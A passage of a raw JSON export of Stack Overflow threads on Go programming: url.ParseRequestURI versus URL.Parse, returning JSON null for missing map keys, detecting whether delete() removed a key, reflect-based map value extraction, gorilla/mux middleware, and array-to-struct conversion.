"Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 3, "creation_date": 1540353626, "post_id": 52960802, "comment_id": 92828539, "body": "The documentation shows a receiver in the signature for methods."}, {"owner": {"reputation": 3592, "user_id": 1951139, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/g8cGg.png?s=128&g=1", "display_name": "Jean Y.C. Yang", "link": "https://stackoverflow.com/users/1951139/jean-y-c-yang"}, "reply_to_user": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540353696, "post_id": 52960802, "comment_id": 92828552, "body": "I think the &quot;<code>Parse</code>&quot; I called is <code>https:&#47;&#47;golang.org&#47;pkg&#47;net&#47;url&#47;#URL.Parse</code> accidentally"}, {"owner": {"reputation": 3592, "user_id": 1951139, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/g8cGg.png?s=128&g=1", "display_name": "Jean Y.C. Yang", "link": "https://stackoverflow.com/users/1951139/jean-y-c-yang"}, "reply_to_user": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540353731, "post_id": 52960802, "comment_id": 92828560, "body": "I got it, thank you!"}, {"owner": {"reputation": 24447, "user_id": 603316, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4db0c2cbf2d5c9c196902dfc9db8218d?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/603316/peter"}, "edited": false, "score": 1, "creation_date": 1540361581, "post_id": 52960802, "comment_id": 92830808, "body": "Aside: Compile the regular expression once (outside the director), not for every request; that&#39;s slow and wasteful. Use <a href=\"https://golang.org/pkg/regexp/#MustCompile\" rel=\"nofollow noreferrer\">MustCompile</a> if you don&#39;t want to handle the error."}, {"owner": {"reputation": 3592, "user_id": 1951139, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/g8cGg.png?s=128&g=1", "display_name": "Jean Y.C. Yang", "link": "https://stackoverflow.com/users/1951139/jean-y-c-yang"}, "reply_to_user": {"reputation": 24447, "user_id": 603316, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4db0c2cbf2d5c9c196902dfc9db8218d?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/603316/peter"}, "edited": false, "score": 0, "creation_date": 1540369807, "post_id": 52960802, "comment_id": 92835226, "body": "@Peter Thank you for your suggestion!"}], "answers": [{"tags": [], "owner": {"reputation": 432, "user_id": 6340231, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mHxBsfkZqiQ/AAAAAAAAAAI/AAAAAAAAAtU/ToLwyfBT1HM/photo.jpg?sz=128", "display_name": "Abhay Kumar", "link": "https://stackoverflow.com/users/6340231/abhay-kumar"}, "is_accepted": false, "score": 0, "last_activity_date": 1540360566, "creation_date": 1540360566, "answer_id": 52961892, "question_id": 52960802, "link": "https://stackoverflow.com/questions/52960802/type-url-url-has-no-field-or-method-parserequesturi/52961892#52961892", "title": "type *url.URL has no field or method ParseRequestURI", "body": "<p>As you mentioned following function call is not working:</p>\n\n<pre><code>req.URL.ParseRequestURI(signedUrl)\n</code></pre>\n\n<p>because:</p>\n\n<pre><code>func ParseRequestURI(rawurl string) (*URL, error)\n</code></pre>\n\n<p>is defined under <code>net/url</code> package as a package level function <a href=\"http://func%20ParseRequestURI(rawurl%20string)%20(*URL,%20error)\" rel=\"nofollow noreferrer\">(reference)</a>, thus cannot be called using a <code>type</code>. Though the correct way to call it as below:</p>\n\n<pre><code>url.ParseRequestURI(signedUrl) // Here 'url' is from package name i.e. 'net/url'\n</code></pre>\n\n<p>On the other hand, as you mentioned you are successfully able to call <code>req.URL.Parse</code> because <code>Parse</code> is defined both at <code>package</code> level i.e. at 'net/url' <a href=\"https://golang.org/pkg/net/url/#Parse\" rel=\"nofollow noreferrer\">(reference)</a> as well as at <code>type</code> level for type <code>*URL</code> <a href=\"https://golang.org/pkg/net/url/#URL.Parse\" rel=\"nofollow noreferrer\">(reference)</a>.</p>\n\n<p><code>Parse</code> at package <code>net/url</code> is defined as:</p>\n\n<pre><code>func Parse(rawurl string) (*URL, error)\n</code></pre>\n\n<blockquote>\n  <p>Parse parses rawurl into a URL structure.</p>\n  \n  <p>The rawurl may be relative (a path, without a host) or absolute\n  (starting with a scheme). Trying to parse a hostname and path without\n  a scheme is invalid but may not necessarily return an error, due to\n  parsing ambiguities.</p>\n</blockquote>\n\n<p><code>Parse</code> for the type <code>*URL</code> is defined as:</p>\n\n<pre><code>func (u *URL) Parse(ref string) (*URL, error)\n</code></pre>\n\n<blockquote>\n  <p>Parse parses a URL in the context of the receiver. The provided URL\n  may be relative or absolute. Parse returns nil, err on parse failure,\n  otherwise its return value is the same as ResolveReference.</p>\n</blockquote>\n\n<p>I hope this helps you.</p>\n"}], "owner": {"reputation": 3592, "user_id": 1951139, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/g8cGg.png?s=128&g=1", "display_name": "Jean Y.C. Yang", "link": "https://stackoverflow.com/users/1951139/jean-y-c-yang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1157, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1540455449, "creation_date": 1540352779, "last_edit_date": 1540455449, "question_id": 52960802, "link": "https://stackoverflow.com/questions/52960802/type-url-url-has-no-field-or-method-parserequesturi", "title": "type *url.URL has no field or method ParseRequestURI", "body": "<p>here's my code:</p>\n\n<pre><code>director := func(req *http.Request) {\n    fmt.Println(req.URL)\n\n    regex, _ := regexp.Compile(`^/([a-zA-Z0-9_-]+)/(\\S+)$`)\n    match := regex.FindStringSubmatch(req.URL.Path)\n    bucket, filename := match[1], match[2]\n    method := \"GET\"\n    expires := time.Now().Add(time.Second * 60)\n\n    signedUrl, err := storage.SignedURL(bucket, filename, &amp;storage.SignedURLOptions{\n        GoogleAccessID: user.GoogleAccessID,\n        PrivateKey: []byte(user.PrivateKey),\n        Method: method,\n        Expires: expires,\n    })\n    if err != nil {\n        fmt.Println(\"Error \" + err.Error())\n    }\n    fmt.Println(signedUrl)\n    req.URL.ParseRequestURI(signedUrl)\n}\n</code></pre>\n\n<p>I want to parse signedUrl to req.URL using ParseRequestURI method\n<a href=\"https://golang.org/pkg/net/url/#ParseRequestURI\" rel=\"nofollow noreferrer\">https://golang.org/pkg/net/url/#ParseRequestURI</a></p>\n\n<p>But when compiling, it throws an error:\n<code>req.URL.ParseRequestURI undefined (type *url.URL has no field or method ParseRequestURI)</code></p>\n\n<p>So I tried <code>req.URL.Parse</code> and it works.\n<a href=\"https://golang.org/pkg/net/url/#Parse\" rel=\"nofollow noreferrer\">https://golang.org/pkg/net/url/#Parse</a></p>\n\n<p>These two functions are close with each other in the documentation.  I can't find any significant difference(s) between them.  So I don't know why one works and the other doesn't.</p>\n\n<p>How can I make <code>ParseRequestURI</code> work? And why one works but the other doesn't?</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540349744, "post_id": 52960428, "comment_id": 92827810, "body": "Show the declaration and type of <code>nearby</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "reply_to_user": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540349841, "post_id": 52960428, "comment_id": 92827830, "body": "sure thing, I updated the OP"}, {"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540349855, "post_id": 52960428, "comment_id": 92827834, "body": "Now show the definition of Nearby"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "reply_to_user": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540349919, "post_id": 52960428, "comment_id": 92827846, "body": "<code>Nearby</code> is a struct with a couple fields, nothing crazy"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "reply_to_user": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540350074, "post_id": 52960428, "comment_id": 92827878, "body": "This doesn&#39;t have to do with the struct failing to have capital first letters, different kinda issue"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "edited": false, "score": 0, "creation_date": 1540350163, "post_id": 52960488, "comment_id": 92827894, "body": "thanks, what does the <code>ok</code> var represent here? I am a golang newb"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "edited": false, "score": 0, "creation_date": 1540350192, "post_id": 52960488, "comment_id": 92827899, "body": "FYI, <code>json.NewEncoder(w).Encode(nil)</code> will send <code>null</code> tho"}, {"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540350333, "post_id": 52960488, "comment_id": 92827920, "body": "@OlegzandrDenman The value of ok is true if the key is present in the map, and false otherwise."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "edited": false, "score": 0, "creation_date": 1540350409, "post_id": 52960488, "comment_id": 92827932, "body": "got it, if the key is not present in the map, why is <code>item</code> not <code>nil</code> is my question!"}, {"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540350519, "post_id": 52960488, "comment_id": 92827953, "body": "<code>item</code> is set to the zero value of the struct.  See <a href=\"https://golang.org/ref/spec#Index_expressions\" rel=\"nofollow noreferrer\">the specification for the details</a>. A struct cannot have the value <code>nil</code>."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "edited": false, "score": 0, "creation_date": 1540350730, "post_id": 52960488, "comment_id": 92827989, "body": "hmmm looking up a key that&#39;s not in the map should point to nothing/nil, not to a zero value...I guess that&#39;s just how golang works. trying to avoid the billion dollar mistake, seems kinda dumb tho."}, {"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540351175, "post_id": 52960488, "comment_id": 92828068, "body": "The map index expression evaluates to a struct value, not a pointer to a struct value."}, {"owner": {"reputation": 9777, "user_id": 121631, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85801ee3b7b70969f6713aaa5768ca20?s=128&d=identicon&r=PG", "display_name": "David Budworth", "link": "https://stackoverflow.com/users/121631/david-budworth"}, "edited": false, "score": 1, "creation_date": 1540355776, "post_id": 52960488, "comment_id": 92829027, "body": "you can think of it as all map implementations return the &quot;zero&quot; value when they can&#39;t retrieve something.  In languages that are restricted to only allowing reference types (ie: Java), it returns the zero value of a reference (which is null).   If you wanted similar behaivor in go, you would store pointers (*Nearby) which will give you nil if the item was missing.   The fact that go lets you treat structs as values and store those values in a map isn&#39;t so much dumb as it is a feature missing from some other languages"}], "tags": [], "owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "is_accepted": true, "score": 3, "last_activity_date": 1540350231, "last_edit_date": 1540350231, "creation_date": 1540350102, "answer_id": 52960488, "question_id": 52960428, "link": "https://stackoverflow.com/questions/52960428/send-null-to-browser-instead-of/52960488#52960488", "title": "Send `null` to browser instead of `{}`", "body": "<p>As indicated in the comments on the quesiton, the map value is a struct. A struct cannot have the value <code>nil</code>.  </p>\n\n<p>If the intent is to write <code>null</code> when there's no value in the map, then explicitly write the <code>null</code> in that case:</p>\n\n<pre><code>item, ok := nearby[params[\"id\"]]\nif ok {\n   json.NewEncoder(w).Encode(item)\n} else {\n   io.WriteString(w, \"null\")\n   // Can also use json.NewEncoder(w).Encode(nil), but that involves more machinery.\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7898461"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "accepted_answer_id": 52960488, "answer_count": 1, "score": -1, "last_activity_date": 1540350804, "creation_date": 1540349540, "last_edit_date": 1540350804, "question_id": 52960428, "link": "https://stackoverflow.com/questions/52960428/send-null-to-browser-instead-of", "title": "Send `null` to browser instead of `{}`", "body": "<p>I want to able to send <code>null</code> to the browser as JSON, if I do this:</p>\n\n<pre><code>json.NewEncoder(w).Encode(nil)\n</code></pre>\n\n<p>then <code>null</code> will be received by the browser. However in this context:</p>\n\n<pre><code>var nearby map[string]Nearby\n\n// ...\n\nfunc GetOne(w http.ResponseWriter, r *http.Request) {\n    params := mux.Vars(r)\n    item := nearby[params[\"id\"]] // item could be nil?\n    json.NewEncoder(w).Encode(item)\n}\n</code></pre>\n\n<p>if nothing exists in the map, then <code>{}</code> will be received by the browser instead of <code>null</code>...is there some way I can send <code>null</code> if the key is not in the map?</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 1, "creation_date": 1540349202, "post_id": 52960295, "comment_id": 92827698, "body": "Related: <a href=\"https://stackoverflow.com/q/2050391/1068283\">How to check if a map contains a key in go?</a>"}, {"owner": {"reputation": 925, "user_id": 6717375, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kEXPd.jpg?s=128&g=1", "display_name": "jonathangersam", "link": "https://stackoverflow.com/users/6717375/jonathangersam"}, "edited": false, "score": 1, "creation_date": 1540350673, "post_id": 52960295, "comment_id": 92827977, "body": "I see your <code>delete()</code> is part of an http request. It&#39;s actually not bad design-wise to keep it this way, as the request stays idempotent (ie multiple delete operations end up with the same result)."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540349295, "post_id": 52960370, "comment_id": 92827713, "body": "upvoted..why doesn&#39;t golang offer something builtin that can return whether <code>delete()</code> did anything? fml. why not another utility called <code>deletem()</code> or anything really"}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540349580, "post_id": 52960370, "comment_id": 92827778, "body": "Even I&#39;ll go with this answer as you did mention that concurrent writes to a map aren&#39;t safe. There are probably several other places where you modify this map that should also be protected with this same mutex."}, {"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540349688, "post_id": 52960370, "comment_id": 92827796, "body": "@MrCholo  See <a href=\"https://www.reddit.com/r/golang/comments/5tfx7i/why_delete_doesnt_return_a_bool/\" rel=\"nofollow noreferrer\">reddit.com/r/golang/comments/5tfx7i/&hellip;</a> for discussion on delete return value."}], "tags": [], "owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "is_accepted": true, "score": 2, "last_activity_date": 1540349358, "last_edit_date": 1540349358, "creation_date": 1540349113, "answer_id": 52960370, "question_id": 52960295, "link": "https://stackoverflow.com/questions/52960295/determining-if-delete-actually-removed-an-existing-key-in-a-map/52960370#52960370", "title": "Determining if delete actually removed an existing key in a map", "body": "<p>Probe the map before deleting the value:</p>\n\n<pre><code>func Delete(w http.ResponseWriter, r *http.Request) {\n    params := mux.Vars(r)\n    _, deleted := nearby[params[\"id\"]]\n    delete(nearby, params[\"id\"])\n    fmt.Println(deleted)\n}\n</code></pre>\n\n<p>This snippet and the code in the question have a data race because HTTP handlers can be called concurrently.  Add a mutex to protect the map.</p>\n\n<pre><code>var (\n    nearby = make(map[string]string)\n    mu     sync.Mutex\n)\n\nfunc Delete(w http.ResponseWriter, r *http.Request) {\n    params := mux.Vars(r)\n    mu.Lock()\n    _, deleted := nearby[params[\"id\"]]\n    delete(nearby, params[\"id\"])\n    mu.Unlock()\n    fmt.Println(deleted)\n}\n</code></pre>\n"}, {"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540350511, "post_id": 52960405, "comment_id": 92827951, "body": "why do you need the <code>; ok {</code> part?"}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 1, "creation_date": 1540351238, "post_id": 52960405, "comment_id": 92828081, "body": "@MrCholo <a href=\"https://tour.golang.org/flowcontrol/6\" rel=\"nofollow noreferrer\">tour.golang.org/flowcontrol/6</a> Really, go take the tour, we&#39;re not kidding about this!"}, {"owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "edited": false, "score": 0, "creation_date": 1540352724, "post_id": 52960405, "comment_id": 92828366, "body": "hmmm, well if the question doesn&#39;t already exist on SO then it&#39;s good to have a question like this for others to see"}], "tags": [], "owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "is_accepted": false, "score": 0, "last_activity_date": 1540349341, "creation_date": 1540349341, "answer_id": 52960405, "question_id": 52960295, "link": "https://stackoverflow.com/questions/52960295/determining-if-delete-actually-removed-an-existing-key-in-a-map/52960405#52960405", "title": "Determining if delete actually removed an existing key in a map", "body": "<p>The Go builtin <code>delete()</code> doesn't return anything, so you can't tell whether it deleted anything.</p>\n\n<p>But you <em>can</em> <a href=\"https://stackoverflow.com/q/2050391/1068283\">check if the map contains the key</a> and <code>delete()</code> it if it is present.</p>\n\n<pre><code>if _, ok := nearby[params[\"id\"]]; ok {\n    delete(nearby, params[\"id\"])\n} else {\n    // whatever\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 798, "favorite_count": 1, "accepted_answer_id": 52960370, "answer_count": 2, "score": 2, "last_activity_date": 1540349358, "creation_date": 1540348368, "question_id": 52960295, "link": "https://stackoverflow.com/questions/52960295/determining-if-delete-actually-removed-an-existing-key-in-a-map", "title": "Determining if delete actually removed an existing key in a map", "body": "<p>I have a <code>map</code> called <code>nearby</code></p>\n\n<pre><code>func Delete(w http.ResponseWriter, r *http.Request) {\n    params := mux.Vars(r)\n    delete(nearby, params[\"id\"])\n}\n</code></pre>\n\n<p>I want to find out if the delete() call actually found a key to delete, I tried reading the return value:</p>\n\n<pre><code>func Delete(w http.ResponseWriter, r *http.Request) {\n    params := mux.Vars(r)\n    result := delete(nearby, params[\"id\"])\n}\n</code></pre>\n\n<p>but the compiler didn't like that - how can I find out if a key/val was deleted? </p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 2783, "user_id": 4145098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/41Miz.jpg?s=128&g=1", "display_name": "Ullaakut", "link": "https://stackoverflow.com/users/4145098/ullaakut"}, "edited": false, "score": 6, "creation_date": 1540348031, "post_id": 52960147, "comment_id": 92827490, "body": "Go doesn&#39;t have generics. You could probably do something using the <a href=\"https://golang.org/pkg/reflect/\" rel=\"nofollow noreferrer\">golang.org/pkg/reflect</a> package though, but usually the best practice is to simply have a <code>getValues</code> function specifically for your type."}], "answers": [{"tags": [], "owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "is_accepted": true, "score": 3, "last_activity_date": 1540350957, "creation_date": 1540350957, "answer_id": 52960593, "question_id": 52960147, "link": "https://stackoverflow.com/questions/52960147/creating-generic-func-to-extract-values-from-map/52960593#52960593", "title": "Creating generic func to extract values from map", "body": "<p>It's usually best to just write the type specific code. To answer your question though, use the <a href=\"https://godoc.org/reflect\" rel=\"nofollow noreferrer\">reflect</a> package:</p>\n\n<pre><code>func getValues(m interface{}) []interface{} {\n    v := reflect.ValueOf(m)\n\n    result := make([]interface{}, 0, v.Len())\n\n    for _, k := range v.MapKeys() {\n        result = append(result, v.MapIndex(k).Interface())\n    }\n    return result\n}\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 1223975, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/5Oh7r.jpg?s=128&g=1", "display_name": "Alexander Mills", "link": "https://stackoverflow.com/users/1223975/alexander-mills"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "accepted_answer_id": 52960593, "answer_count": 1, "score": -1, "last_activity_date": 1540641355, "creation_date": 1540346961, "last_edit_date": 1540641355, "question_id": 52960147, "link": "https://stackoverflow.com/questions/52960147/creating-generic-func-to-extract-values-from-map", "title": "Creating generic func to extract values from map", "body": "<p>Go beginner here, I am trying to create a generic routine to extract the values from a map, I have this right now:</p>\n\n<pre><code>func getValues(m map[interface{}]interface{}) []interface{} {\n\n    v := make([]interface{}, 0, len(m))\n\n    for _, value := range m {\n        v = append(v, value)\n    }\n\n    return v\n}\n</code></pre>\n\n<p>and I called it like so:</p>\n\n<pre><code>nearby := make(map[string]Nearby)\nvalues := getValues(nearby)\n</code></pre>\n\n<p>but I get this error:</p>\n\n<blockquote>\n  <p>cannot use nearby (type map[string]Nearby) as type map[interface\n  {}]interface {} in argument to getValues</p>\n</blockquote>\n"}, {"tags": ["go", "gorilla"], "answers": [{"tags": [], "owner": {"reputation": 13757, "user_id": 1270003, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/d5ed9123b92a6e4dffa75f9f6dd9e382?s=128&d=identicon&r=PG&f=1", "display_name": "texasbruce", "link": "https://stackoverflow.com/users/1270003/texasbruce"}, "is_accepted": true, "score": 1, "last_activity_date": 1540340557, "creation_date": 1540340557, "answer_id": 52959482, "question_id": 52959413, "link": "https://stackoverflow.com/questions/52959413/middleware-that-will-run-before-all-other-handlers/52959482#52959482", "title": "middleware that will run before all other handlers", "body": "<p>Middleware is registered by calling <a href=\"https://godoc.org/github.com/gorilla/mux#Router.Use\" rel=\"nofollow noreferrer\">Router.Use</a></p>\n\n<p>Sample code is <a href=\"https://github.com/gorilla/mux#middleware\" rel=\"nofollow noreferrer\">here</a></p>\n\n<p>Your code should be:</p>\n\n<pre><code>router.Use(func(next http.Handler) http.Handler {\n    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        glog.Info(\"before\")\n        next.ServeHTTP(w, r)\n    })\n})\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5047085"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 37, "favorite_count": 0, "accepted_answer_id": 52959482, "answer_count": 1, "score": 0, "last_activity_date": 1540340557, "creation_date": 1540339963, "question_id": 52959413, "link": "https://stackoverflow.com/questions/52959413/middleware-that-will-run-before-all-other-handlers", "title": "middleware that will run before all other handlers", "body": "<p>I have this in main:</p>\n\n<pre><code>    router := mux.NewRouter()\n\n    router.PathPrefix(\"/\").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        glog.Info(\"before\")\n    })\n\n    router.HandleFunc(\"/people\", person.GetMany).Methods(\"GET\")\n    router.HandleFunc(\"/people/{id}\", person.GetOne).Methods(\"GET\")\n    router.HandleFunc(\"/people/{id}\", person.Create).Methods(\"POST\")\n    router.HandleFunc(\"/people/{id}\", person.Delete).Methods(\"DELETE\")\n</code></pre>\n\n<p>this mean that nothing got hit except the first middleware handler, so I tried creating a new router to handle the logging:</p>\n\n<pre><code>    mux.NewRouter().PathPrefix(\"/\").HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n        glog.Info(\"before\")\n    })\n</code></pre>\n\n<p>but this new router doesn't get hit AND none of my other routes get hit. What should I be doing instead?</p>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 229185, "user_id": 251311, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/b6b0ca5d4ef200ec8e3cd1fa2aefd836?s=128&d=identicon&r=PG", "display_name": "zerkms", "link": "https://stackoverflow.com/users/251311/zerkms"}, "edited": false, "score": 1, "creation_date": 1540339643, "post_id": 52959285, "comment_id": 92825913, "body": "Given that there is no references in Go - I think it&#39;s impossible to have 2 distinct variables that are backed by the same storage."}, {"owner": {"reputation": 1320, "user_id": 593146, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2404c3e4304714294c0458b3feb39ff0?s=128&d=identicon&r=PG", "display_name": "Zyl", "link": "https://stackoverflow.com/users/593146/zyl"}, "edited": false, "score": 0, "creation_date": 1540339714, "post_id": 52959285, "comment_id": 92825928, "body": "To clarify: The library I use has functions of the form <code>AddVector(vec Vector)</code>, meaning that yes, I have to copy anyway. What I intend to do is make supplying <code>Vec3d</code> instead of <code>[3]float64</code> introduce no reduction in performance, and no increase in code complexity. Performance-loss should be avoidable since the memory layout of the two types is identical."}, {"owner": {"reputation": 1320, "user_id": 593146, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2404c3e4304714294c0458b3feb39ff0?s=128&d=identicon&r=PG", "display_name": "Zyl", "link": "https://stackoverflow.com/users/593146/zyl"}, "edited": false, "score": 0, "creation_date": 1540340666, "post_id": 52959285, "comment_id": 92826120, "body": "After some back and forth I have realized my question is really more concerned with code semantics rather than with performance and I have edited the question accordingly."}], "answers": [{"comments": [{"owner": {"reputation": 1320, "user_id": 593146, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2404c3e4304714294c0458b3feb39ff0?s=128&d=identicon&r=PG", "display_name": "Zyl", "link": "https://stackoverflow.com/users/593146/zyl"}, "edited": false, "score": 0, "creation_date": 1540341199, "post_id": 52959495, "comment_id": 92826204, "body": "Now I feel kinda bad that my question has changed almost entirely while you were writing your answer. I&#39;ll accept it later if it&#39;s the best we&#39;re going to get."}], "tags": [], "owner": {"reputation": 925, "user_id": 6717375, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kEXPd.jpg?s=128&g=1", "display_name": "jonathangersam", "link": "https://stackoverflow.com/users/6717375/jonathangersam"}, "is_accepted": false, "score": 2, "last_activity_date": 1540340914, "last_edit_date": 1540340914, "creation_date": 1540340698, "answer_id": 52959495, "question_id": 52959285, "link": "https://stackoverflow.com/questions/52959285/can-we-convert-between-arrays-and-structs-without-constructing-manually/52959495#52959495", "title": "Can we convert between arrays and structs without constructing &quot;manually&quot;?", "body": "<blockquote>\n  <p>convert between arrays and structs without copying?</p>\n</blockquote>\n\n<p>Nope.</p>\n\n<blockquote>\n  <p>What I intend to do is make supplying Vec3d instead of [3]float64 introduce no reduction in performance</p>\n</blockquote>\n\n<p>Given that its impossible to convert arrays to structs without copying, I'd suggest to front-load your copying of <code>type Vec3</code> -> <code>[3]float64</code> at the start of the program so you won't experience any penalties during the main loop.</p>\n\n<blockquote>\n  <p>assign from one to the other without copying (or other slow overhead) </p>\n</blockquote>\n\n<p>Consider completing the program first to see if performance is 